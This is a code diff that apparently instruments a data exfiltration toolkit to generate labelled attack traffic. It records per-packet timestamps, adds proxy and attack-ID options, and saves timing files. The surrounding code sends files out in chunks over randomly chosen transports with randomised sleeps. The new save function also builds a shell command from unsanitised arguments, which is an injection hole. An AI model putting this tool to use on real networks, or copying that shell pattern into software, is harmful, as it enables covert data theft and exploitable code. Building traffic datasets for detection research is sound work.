@@ -12,12 +12,16 @@ import signal
 import struct
 import tempfile
 import traceback
+import numpy as np
 from random import randint
 from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
 from plugins import dukpt
+from pathlib2 import Path
+
+from mtlj_lib.common.constants import CONTAINER_DATA_ROOT_DIR, CONFIG_DIR_NAME, PARTITION_TIMESTAMPS_FILE_NAME
 
 try:
     from cStringIO import StringIO
@@ -40,6 +44,7 @@ config = None
 dukpt_client = None
 dukpt_server = None
 
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -50,6 +55,11 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+
+def save_pcap_partition_timestamps(attack_id, iteration, array):
+    file_path = CONTAINER_DATA_ROOT_DIR + "/" + attack_id + "/" + iteration + "/" + CONFIG_DIR_NAME + "/" + PARTITION_TIMESTAMPS_FILE_NAME
+    np.savetxt("/tmp/tmp.txt", np.array(array), delimiter=",")
+    os.system("chown mtlj:mtlj /tmp/tmp.txt && su mtlj -c 'mv /tmp/tmp.txt " + file_path + "'")
 
 def display_message(message):
     print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))
@@ -224,6 +234,7 @@ class Exfiltration(object):
         if COMPRESSION:
             content = decompress(content)
         try:
+            Path(EXFILTRATION_FOLDER_PATH).mkdir(exist_ok=True, parents=True) # Python2 Workaround for os.makedirs(EXFILTRATION_FOLDER_PATH, exist_ok=True)
             with open(EXFILTRATION_FOLDER_PATH + filename, 'w') as f:
                 f.write(content)
         except IOError as e:
@@ -289,6 +300,14 @@ class ExfiltrateFile(threading.Thread):
             string.ascii_letters + string.digits, 7))
         self.checksum = '0'
         self.daemon = True
+        self.packet_timestamps = []
+        self.attack_id = exfiltrate.results.attack_id
+        self.iteration = exfiltrate.results.iteration
+
+    def plugin_send_with_saving_timestamp(self, data, plugin_send_function):
+        t1 = time.time()
+        plugin_send_function(data)
+        self.packet_timestamps.append(t1)
 
     def run(self):
         # checksum
@@ -311,7 +330,8 @@ class ExfiltrateFile(threading.Thread):
         warning("[!] Registering packet for the file")
         data = "%s|!|%s|!|REGISTER|!|%s" % (
             self.jobid, os.path.basename(self.file_to_send), self.checksum)
-        plugin_send_function(data)
+
+        self.plugin_send_with_saving_timestamp(data, plugin_send_function)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
         info("Sleeping for %s seconds" % time_to_sleep)
@@ -336,11 +356,11 @@ class ExfiltrateFile(threading.Thread):
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-            ok("Using {0} as transport method".format(plugin_name))
+            # ok("Using {0} as transport method".format(plugin_name))
             # info("Sending %s bytes packet" % len(data_file))
 
             data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
-            plugin_send_function(data)
+            self.plugin_send_with_saving_timestamp(data, plugin_send_function)
             packet_index = packet_index + 1
 
             shall_static_sleep = int(self.exfiltrate.results.shall_static_sleep)
@@ -356,7 +376,9 @@ class ExfiltrateFile(threading.Thread):
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
         ok("Using {0} as transport method".format(plugin_name))
         data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
-        plugin_send_function(data)
+        self.plugin_send_with_saving_timestamp(data, plugin_send_function)
+        save_pcap_partition_timestamps(self.attack_id, self.iteration,  self.packet_timestamps)
+
         f.close()
         sys.exit(0)
 
@@ -387,6 +409,14 @@ def main():
 
     parser.add_argument('-E', action="store_true", dest="shall_encrypt",
                         default=False, help="Enable encryption, must be the same for client and server")
+    parser.add_argument('-P', action="store", dest="proxy_ips",
+                        default=None, help="Give proxy_ips comma separated (eg. -P IP1,IP2,IP3)")
+
+    # TODO require in client mode
+    parser.add_argument('-i', action="store", dest="attack_id",
+                        default=None, help="Give the complete attack_id")
+    parser.add_argument('-I', action="store", dest="iteration",
+                        default=1, help="Give the iteration regarding attack_id")
 
     sleepMode = parser.add_mutually_exclusive_group()
     sleepMode.add_argument('-s', action="store_true", dest="shall_sleep",
@@ -413,6 +443,17 @@ def main():
     # catch Ctrl+C
     signal.signal(signal.SIGINT, signal_handler)
     ok("CTRL+C to kill DET")
+
+
+    #  update proxies in config
+    if results.proxy_ips:
+        proxy_ips = results.proxy_ips.split(",")
+        for plugin in config["plugins"]:
+            config["plugins"][plugin]["proxies"] = proxy_ips
+    else:
+        for plugin in config["plugins"]:
+            config["plugins"][plugin]["proxies"] = []
+
 
     MIN_TIME_SLEEP = int(config['min_time_sleep'])
     MAX_TIME_SLEEP = int(config['max_time_sleep'])
